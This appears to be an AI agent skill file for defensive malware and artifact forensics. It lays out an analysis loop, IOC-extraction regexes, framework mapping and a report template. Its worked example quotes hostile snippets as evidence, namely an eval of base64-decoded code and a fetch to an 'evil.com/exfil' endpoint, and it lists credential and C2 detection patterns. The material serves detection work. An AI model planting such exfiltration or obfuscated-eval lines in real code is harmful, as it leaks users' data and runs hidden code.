---
name: artifact-analysis-loop
description: "\"Systematic artifact examination for code, files, and binaries. Use when analyzing suspicious files, reverse engineering code patterns, or conducting forensic investigation of specific artifacts. Triggers: analyze this artifact, examine file, dissect sample, malware analysis, forensic investigation.\""

---
# artifact-analysis-loop

Use this skill when conducting systematic artifact analysis (files, code, binaries, configs).

## Source

Distilled from 35+ `analyzing-*` skills (Anthropic Cybersecurity Skills) and generalized for software artifacts.

## When to Use

- Analyzing suspicious files or code
- Malware/sample examination
- Post-incident artifact forensics
- Vulnerability analysis in specific files
- Reverse engineering code patterns

## Artifact Analysis Loop

```
┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│ Collect  │ → │ Identify │ → │ Analyze  │ → │ Extract  │ → │   Map    │
│ Artifact │    │   Type   │    │ Structure│    │ Findings │    │ to Frame-│
│          │    │          │    │          │    │          │    │ work     │
└──────────┘    └──────────┘    └──────────┘    └──────────┘    └──────────┘
                                                            ↓
                                                  ┌──────────┐
                                                  │  Report  │
                                                  │Findings  │
                                                  └──────────┘
```

## Analysis Workflow

```markdown
## Artifact Analysis Loop

1. **Collect** → Artifact: [file, code snippet, binary, config, log]
2. **Identify** → Type: [source code, binary, config, log, data]
3. **Analyze** → Structure: [static, dynamic, pattern match]
4. **Extract** → Findings: [patterns, indicators, relationships]
5. **Map** → To framework: [OWASP, CVE, MITRE, CWE]
6. **Correlate** → With context: [git history, PR, incident]
7. **Report** → Structured findings with confidence
```

## Artifact Types & Analysis Methods

### 1. Source Code Analysis

```yaml
artifact_type: source_code
analysis_methods:
  static:
    - pattern_matching: [regex, AST]
    - control_flow: [function_graph, call_graph]
    - data_flow: [variable_taints, function_args]
    - import_analysis: [dependencies, external_calls]
  dynamic:
    - execution: [sandbox, test_env]
    - behavior: [network, filesystem, process]
signs_of_malice:
  - eval_exec_abuse: [eval(), exec(), Function(), new Function()]
  - obfuscation: [encoded_strings, dead_code, indirect_calls]
  - credential_access: [env_vars, config_files, hardcoded_secrets]
  - network_suspicious: [hardcoded_ips, dns_tunneling, c2_patterns]
```

### 2. Binary Analysis

```yaml
artifact_type: binary
analysis_methods:
  static:
    - file_metadata: [size, entropy, sections]
    - string_extraction: [strings, IOCs]
    - header_analysis: [pe_format, elf_format]
    - symbol_analysis: [exported_funcs, imports]
  dynamic:
    - sandbox_execution: [cuckoo, any.run]
    - memory_analysis: [volatility, rekall]
    - network_capture: [wireshark, mitmproxy]
signs_of_malice:
  - persistence: [registry, startup, service]
  - injection: [dll_injection, process_hollowing]
  - network: [suspicious_connections, dns_tunnel]
```

### 3. Configuration Analysis

```yaml
artifact_type: config
analysis_methods:
  - syntax_validation: [json, yaml, toml]
  - permission_analysis: [file_perms, ownership]
  - secret_detection: [api_keys, tokens, passwords]
  - network_config: [endpoints, ports, protocols]
  - security_options: [tls, auth, encryption]
signs_of_malice:
  - misconfiguration: [overly_permissive, default_creds]
  - secrets: [hardcoded_keys, plaintext_passwords]
  - network: [unencrypted, suspicious_endpoints]
```

### 4. Log Analysis

```yaml
artifact_type: log
analysis_methods:
  - timeline_reconstruction: [timestamp_analysis, event_order]
  - pattern_detection: [anomaly, repeated_failure]
  - correlation: [cross_source, session_analysis]
  - ioc_extraction: [ips, domains, hashes, users]
  - attack_indicators: [kill_chain_phases, techniques]
signs_of_malice:
  - auth_failures: [brute_force, credential_stuffing]
  - suspicious_actions: [privilege_escalation, lateral_movement]
  - data_access: [bulk_download, unusual_access]
```

## IOC Extraction Patterns

```yaml
ioc_types:
  credentials:
    patterns:
      - '(api[_-]?key|secret|token|password)\s*[=:]\s*["\']?[A-Za-z0-9+/]{20,}'
      - '(ghp|github)_[A-Za-z0-9]{36,}'
      - 'Bearer\s+[A-Za-z0-9+/=._-]+'
    extraction: regex
  network:
    patterns:
      - '\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
      - '\b(?:[a-f0-9]{1,4}:){7}[a-f0-9]{1,4}\b'  # IPv6
      - '(?:https?|tcp|udp)://[^\s]+'
    validation: whois, reverse_dns
  file_hashes:
    patterns:
      - '\b[A-Fa-f0-9]{32}\b'  # MD5
      - '\b[A-Fa-f0-9]{40}\b'  # SHA1
      - '\b[A-Fa-f0-9]{64}\b'  # SHA256
    validation: virus_total, malware_db
```

## Framework Mapping

```yaml
frameworks:
  MITRE_ATTACK:
    technique_extraction:
      - tactic: [initial_access, execution, persistence]
      - technique: [T1190, T1059, T1547]
      - indicators: [specific patterns that map]
  OWASP:
    category_extraction:
      - category: [A1, A2, A3, ...]
      - weakness: [injection, auth_failure, sensitive_data]
      - indicators: [code patterns that map]
  CWE:
    weakness_extraction:
      - cwe_id: [CWE-78, CWE-79, CWE-89]
      - description: [command_injection, xss, sql_injection]
      - indicators: [code patterns that map]
```

## Artifact Analysis Report

```
Artifact Analysis Report
========================

Artifact: [filename, path, hash]
Type: [source_code|binary|config|log]
Analysis Date: [timestamp]
Confidence: [High|Medium|Low]

## Findings

### 1. [Finding Name]
   Severity: [Critical|High|Medium|Low]
   Location: [file:line or offset]
   Evidence: [exact match, hex dump, string]
   Framework: [ATT&CK T1059, OWASP A1, CWE-78]
   Recommendation: [how to fix/mitigate]

### 2. [Finding Name]
   ...

## IOCs Extracted

- IPs/Domains: [list]
- Hashes: [list]
- Credentials: [list]
- URLs: [list]

## Correlation

- Git History: [recent commits, authors]
- Related Artifacts: [files with similar patterns]
- Incident Context: [if part of investigation]

## Conclusion

[Overall assessment, confidence, next actions]
```

## Analysis Examples

### Example 1: JavaScript Malware Analysis

```yaml
artifact:
  file: suspicious.js
  type: source_code
  size: 2.4KB

analysis:
  static_findings:
    - type: obfuscation
      evidence: "eval(atob(base64_string))"
      severity: high
    - type: network_indicators
      evidence: "fetch('https://evil.com/exfil')"
      severity: critical
  iocs:
    - type: domain
      value: evil.com
    - type: technique
      value: command_and_control
  framework_mapping:
    MITRE: [T1059.003 JavaScript, T1071.001 C2]
    OWASP: [A7:2017 Security Misconfiguration]
```

### Example 2: Configuration Secret Detection

```yaml
artifact:
  file: config.json
  type: config
  findings:
    - type: hardcoded_secret
      location: line 23
      evidence: '"api_key": "sk-live-abc123xyz"'
      severity: critical
    - type: insecure_transport
      location: line 45
      evidence: '"protocol": "http"'
      severity: high
```

## Anti-Patterns

- **Don't** analyze without collecting metadata first (missing context)
- **Don't** skip type identification (wrong analysis approach)
- **Don't** skip validation of IOCs (false positives)
- **Don't** skip framework mapping (missing MITRE/OWASP context)
- **Don't** skip correlation with other artifacts (missing campaign context)

## Enforcement — Artifact Analysis Gate

**Before reporting findings, verify:**

- [ ] Artifact type identified and confirmed (source code / binary / config / log)
- [ ] Analysis approach matches artifact type (static analysis, sandbox, syntax validation)
- [ ] At least one finding with evidence and severity
- [ ] IOCs validated (not just regex match)
- [ ] Framework mapping included (MITRE ATT&CK, OWASP, or CWE)
- [ ] Report includes confidence level and recommendations

If ANY answer is NO → Stop. State what's missing. Do not report findings.

## Tools

| Tool | Purpose |
|------|---------|
| `rg` (ripgrep) | Pattern search, IOC extraction |
| `semgrep` | AST-based analysis |
| `jq` | JSON/YAML parsing |
| `strings` | Binary string extraction |
| `file` | File type identification |
| `xxd` | Hex dump analysis |

## Verification

For artifact analysis changes:
```bash
cd pi-crew
npx tsc --noEmit
node --experimental-strip-types --test test/unit/artifact-analysis.test.ts
```

*See also: `event-log-tracing` for log analysis, `threat-hypothesis-framework` for investigation methodology.*